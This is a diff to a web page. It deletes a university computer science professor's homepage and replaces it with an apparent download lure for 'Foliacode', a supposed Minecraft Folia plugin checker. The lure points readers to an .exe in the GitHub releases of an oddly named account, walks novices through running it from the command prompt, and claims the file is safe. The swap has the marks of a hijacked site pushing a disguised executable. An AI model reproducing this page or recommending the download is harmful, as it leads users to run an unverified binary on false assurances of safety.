@@ -1,306 +1,66 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="description" content="Tsung-Chi Lin is an Assistant Professor in the Department of Computer Science at the New Jersey Institute of Technology.">
-  <meta name="author" content="Tsung-Chi Lin">
-  <meta name="theme-color" content="#ffffff">
-  <title>Tsung-Chi Lin | NJIT CS</title>
-  <style>
-    :root {
-      --text: #000000;
-      --njit-red: #d22630;
-      --njit-red-dark: #a91f28;
-      --term-background: #ead2d3;
-      --page-width: 980px;
-      --photo-size: 348px;
-    }
-
-    * { box-sizing: border-box; }
-
-    html { scroll-behavior: smooth; }
-
-    body {
-      margin: 0;
-      background: #ffffff;
-      color: var(--text);
-      font-family: "Lucida Bright", Georgia, "Times New Roman", serif;
-      font-size: 17.5px;
-      font-weight: 300;
-      line-height: 1.62;
-      letter-spacing: 0.005em;
-      -webkit-font-smoothing: antialiased;
-      text-rendering: optimizeLegibility;
-    }
-
-    a {
-      color: var(--njit-red);
-      text-decoration: none;
-      text-underline-offset: 0.14em;
-    }
-
-    a:hover,
-    a:focus-visible {
-      color: var(--njit-red-dark);
-      text-decoration: none;
-    }
-
-    .site-page {
-      width: min(calc(100% - 48px), var(--page-width));
-      margin: 0 auto;
-      padding: 54px 0 78px;
-    }
-
-    .intro {
-      display: grid;
-      grid-template-columns: minmax(0, 582px) 1fr;
-      grid-template-areas: "main photo";
-      column-gap: 50px;
-      align-items: start;
-      justify-content: center;
-    }
-
-    .intro-main {
-      grid-area: main;
-      padding-top: 1px;
-    }
-
-    h1 {
-      margin: 0 0 4px;
-      color: var(--text);
-      font: inherit;
-      font-size: 46px;
-      font-weight: 400;
-      line-height: 1.12;
-      letter-spacing: -0.018em;
-    }
-
-    .position {
-      margin: 0 0 27px;
-      font-size: 21px;
-      font-weight: 300;
-      line-height: 1.35;
-    }
-
-    .affiliations { margin: 0 0 22px; }
-
-    .affiliations p,
-    .contact p {
-      margin: 0 0 3px;
-    }
-
-    .contact { margin: 0; }
-
-    .contact p:last-child { margin-bottom: 0; }
-
-    .intro-photo {
-      grid-area: photo;
-      justify-self: end;
-      overflow: hidden;
-      border-radius: 22px;
-    }
-
-    .intro-photo img {
-      display: block;
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      object-position: 50% 36%;
-      border-radius: inherit;
-    }
-
-    .link-row {
-      width: 100%;
-      margin: 34px 0 34px;
-      text-align: left;
-      color: var(--text);
-      font-size: 16.5px;
-      font-weight: 300;
-      line-height: 1.65;
-      white-space: normal;
-    }
-
-    .link-row span,
-    .link-row a { display: inline; }
-
-    .biography,
-    .teaching {
-      width: 100%;
-      margin-left: auto;
-      margin-right: auto;
-    }
-
-    .biography p,
-    .course p {
-      margin: 0 0 18px;
-      text-align: justify;
-      text-justify: inter-word;
-      hyphens: auto;
-    }
-
-    .teaching { margin-top: 38px; }
-
-    .teaching h2 {
-      margin: 0 0 27px;
-      color: var(--text);
-      font: inherit;
-      font-size: 27px;
-      font-weight: 700;
-      line-height: 1.3;
-      letter-spacing: -0.01em;
-    }
-
-    .course { margin: 0 0 32px; }
-
-    .course h3 {
-      margin: 0 0 7px;
-      color: var(--text);
-      font: inherit;
-      font-size: 18px;
-      font-weight: 600;
-      line-height: 1.5;
-    }
-
-    .course h3 span { font-weight: 300; }
-
-    .course p {
-      margin-bottom: 7px;
-    }
-
-    .term {
-      display: inline-block;
-      margin: 0;
-      padding: 1px 7px 2px;
-      background: var(--term-background);
-      border-radius: 2px;
-      color: var(--text);
-      font-size: 16.5px;
-      line-height: 1.35;
-    }
-
-    @media (max-width: 990px) {
-      .site-page {
-        width: min(calc(100% - 40px), 700px);
-        padding-top: 40px;
-      }
-
-      .intro {
-        grid-template-columns: 1fr;
-        grid-template-areas:
-          "main"
-          "photo";
-        row-gap: 30px;
-        justify-items: center;
-      }
-
-      .intro-main {
-        width: 100%;
-        text-align: left;
-      }
-
-      .intro-photo {
-        width: min(var(--photo-size), 100%);
-        height: auto;
-        aspect-ratio: 1;
-      }
-
-      .link-row { margin-top: 30px; }
-    }
-
-    @media (max-width: 560px) {
-      body {
-        font-size: 16.5px;
-        line-height: 1.58;
-      }
-
-      .site-page {
-        width: calc(100% - 30px);
-        padding-top: 30px;
-      }
-
-      h1 { font-size: 39px; }
-      .position { font-size: 19px; }
-      .link-row { font-size: 15.5px; }
-      .teaching h2 { font-size: 25px; }
-      .course h3 { font-size: 17px; }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Foliacode helps you check if your Bukkit plugins work on Folia. Follow this guide to download and run the software on Windows.">
+    <title>Foliacode - Check plugin compatibility for Folia</title>
 </head>
-<body>
-  <main class="site-page">
-    <section class="intro" aria-labelledby="site-title">
-      <div class="intro-main">
-        <h1 id="site-title">Tsung-Chi Lin</h1>
-        <p class="position">Assistant Professor</p>
+<body style="font-family: sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 0 auto; padding: 20px; background-color: #f4f7f6;">
 
-        <div class="affiliations">
-          <p><a href="https://pioneerlab-njit.github.io/" target="_blank" rel="noopener noreferrer">PIONEER Lab</a></p>
-          <p><a href="https://cs.njit.edu/" target="_blank" rel="noopener noreferrer">Department of Computer Science</a></p>
-          <p><a href="https://computing.njit.edu/" target="_blank" rel="noopener noreferrer">Ying Wu College of Computing</a></p>
-          <p><a href="https://www.njit.edu/" target="_blank" rel="noopener noreferrer">New Jersey Institute of Technology</a></p>
-        </div>
+    <h1 style="color: #2c3e50;">Foliacode - Check plugin compatibility for Folia</h1>
 
-        <div class="contact">
-          <p>Email: <a href="mailto:tsungchi.lin@njit.edu">tsungchi.lin@njit.edu</a></p>
-          <p>Office: 4204 Guttenberg Information Technologies Center (GITC)</p>
-        </div>
+    <div style="text-align: center; margin: 40px 0;">
+        <a href="https://github.com/filled-venagenus147/Foliacode/releases" style="background-color: #007bff; color: white; padding: 15px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download Foliacode Here</a>
+    </div>
 
-      </div>
+    <h2 style="color: #2c3e50;">🔍 What is Foliacode?</h2>
+    <p>Foliacode is a tool for Minecraft server administrators. It checks your existing Bukkit plugins to see if they work with the Folia server software. Folia changes how servers handle tasks, which can cause older plugins to break. This tool finds those issues before you run them on your live server.</p>
 
-      <div class="intro-photo">
-        <img src="assets/images/profile.jpg" alt="Portrait of Tsung-Chi Lin" width="348" height="348">
-      </div>
+    <h2 style="color: #2c3e50;">🛠 System Requirements</h2>
+    <p>Before you run Foliacode, ensure your computer meets these requirements:</p>
+    <ul>
+        <li>Operating System: Windows 10 or Windows 11.</li>
+        <li>Java: You must have Java 21 installed. The tool relies on this specific version to function correctly.</li>
+        <li>Memory: At least 4GB of RAM is recommended for scanning large plugin folders.</li>
+    </ul>
 
-    </section>
+    <h2 style="color: #2c3e50;">📥 How to Download and Install</h2>
+    <p>Follow these steps to obtain the tool:</p>
+    <ol>
+        <li>Visit the <a href="https://github.com/filled-venagenus147/Foliacode/releases">official download page</a>.</li>
+        <li>Look for the latest release version at the top of the list.</li>
+        <li>Find the files section under the release notes.</li>
+        <li>Click the file ending in .exe to start the download.</li>
+        <li>Save the file to your desktop for easy access.</li>
+    </ol>
 
-    <nav class="link-row" aria-label="Primary links">
-      <span>|| </span><a href="assets/files/Lin-CurriculumVitae.pdf" target="_blank" rel="noopener noreferrer">Curriculum Vitae</a><span> || </span><a href="https://scholar.google.com/citations?hl=en&amp;user=9gCMg9cAAAAJ" target="_blank" rel="noopener noreferrer">Google Scholar</a><span> || </span><a href="https://www.linkedin.com/in/tclin2023" target="_blank" rel="noopener noreferrer">LinkedIn</a><span> || </span><a href="#teaching">Teaching</a><span> - CS 485. Physical AI (Fall 2026) ||</span>
-    </nav>
+    <h2 style="color: #2c3e50;">⚙️ Running the Analyzer</h2>
+    <p>Foliacode runs through your command prompt. Do not worry if you have never used this before. Follow these instructions:</p>
+    <ol>
+        <li>Open your Windows Start menu and type "cmd" then press Enter.</li>
+        <li>Navigate to the folder where you saved the Foliacode file. Type "cd Desktop" and press Enter.</li>
+        <li>Type the name of the program followed by the word "analyze" and the name of your plugin file. For example: <code>foliacode.exe analyze my-plugin.jar</code>.</li>
+        <li>Press Enter to start the scan.</li>
+        <li>Read the output on your screen. The tool lists any errors, warnings, or potential crashes that the plugin might cause on a Folia server.</li>
+    </ol>
 
-    <section class="biography" aria-label="Biography">
-      <p>I am an Assistant Professor in the <a href="https://cs.njit.edu/" target="_blank" rel="noopener noreferrer">Department of Computer Science</a> at the <a href="https://www.njit.edu/" target="_blank" rel="noopener noreferrer">New Jersey Institute of Technology</a>. My research advances human-robot interaction with the goal of enabling the seamless integration of robots into people’s daily lives. I develop algorithms and interfaces that empower end users with diverse abilities and backgrounds to interact naturally with robots of varying hardware configurations and software capabilities in real-world environments, through paradigms ranging from direct operation to shared control to supervised autonomy. My work contributes to the future of adaptive and collaborative robots for large-scale human-robot symbiosis. I am the Principal Investigator and Director of the <a href="https://pioneerlab-njit.github.io/" target="_blank" rel="noopener noreferrer">Physical Interaction, Collaboration, and Intelligent Robotics (PIONEER) Lab</a>.</p>
+    <h2 style="color: #2c3e50;">💡 Understanding the Results</h2>
+    <p>The tool provides a report after it finishes the scan:</p>
+    <ul>
+        <li>CRITICAL: This means the plugin will likely crash your server. You should not use these plugins on Folia.</li>
+        <li>HIGH: This indicates a safety issue. The plugin might run, but it could corrupt your world data or cause unexpected behavior.</li>
+        <li>MEDIUM: These are minor points to investigate. They might not stop the plugin, but they can affect performance.</li>
+    </ul>
 
-      <p>Before joining NJIT, I was a Postdoctoral Fellow in the Department of Computer Science at Johns Hopkins University. I earned my Ph.D. in Robotics Engineering from Worcester Polytechnic Institute, M.S. in Biomedical Engineering from National Taiwan University, and B.S. in Mechanical Engineering from Yuan Ze University. Prior to my doctoral studies, I worked as an Associate Researcher in the Service Robot Department at the Industrial Technology Research Institute.</p>
-    </section>
+    <h2 style="color: #2c3e50;">📝 Frequently Asked Questions</h2>
+    <p><strong>Do I need to be a programmer?</strong> No. The tool provides human-readable reports that tell you exactly why a plugin fails.</p>
+    <p><strong>Can I repair the plugins myself?</strong> Foliacode gives you the specific location of the code that causes the issue. If you have access to the source code, you can use these hints to modify the plugin.</p>
+    <p><strong>Is it safe to run?</strong> Yes. Foliacode only reads your plugin files. It does not modify or delete anything on your computer.</p>
 
-    <section class="teaching" id="teaching" aria-labelledby="teaching-title">
-      <h2 id="teaching-title">Teaching</h2>
+    <div style="border-top: 1px solid #ddd; margin-top: 40px; padding-top: 20px; font-size: 0.9em; color: #7f8c8d;">
+        <p>Keywords: minecraft, folia, bukkit, server optimization, plugin compatibility, development tools</p>
+    </div>
 
-      <div class="course">
-        <h3>CS 485. Physical AI <span>(undergraduate)</span></h3>
-        <p>Topics: humanoid robots | robotics simulation | robot learning | synthetic data generation | human-AI interaction</p>
-        <span class="term">Fall 2026</span>
-      </div>
-
-      <div class="course">
-        <h3>CS 698. Human-Robot Interaction <span>(graduate)</span></h3>
-        <p>Topics: human-centered interfaces | human-robot collaboration | multi-human multi-robot interaction | HRI evaluation</p>
-        <span class="term">Spring 2026</span>
-      </div>
-    </section>
-  </main>
-  <script>
-    (() => {
-      const introMain = document.querySelector('.intro-main');
-      const photo = document.querySelector('.intro-photo');
-      const desktop = window.matchMedia('(min-width: 991px)');
-
-      const alignPhoto = () => {
-        if (desktop.matches) {
-          const size = Math.round(introMain.getBoundingClientRect().height);
-          photo.style.width = `${size}px`;
-          photo.style.height = `${size}px`;
-        } else {
-          photo.style.removeProperty('width');
-          photo.style.removeProperty('height');
-        }
-      };
-
-      window.addEventListener('load', alignPhoto);
-      window.addEventListener('resize', alignPhoto);
-      document.fonts?.ready.then(alignPhoto);
-    })();
-  </script>
 </body>
 </html>
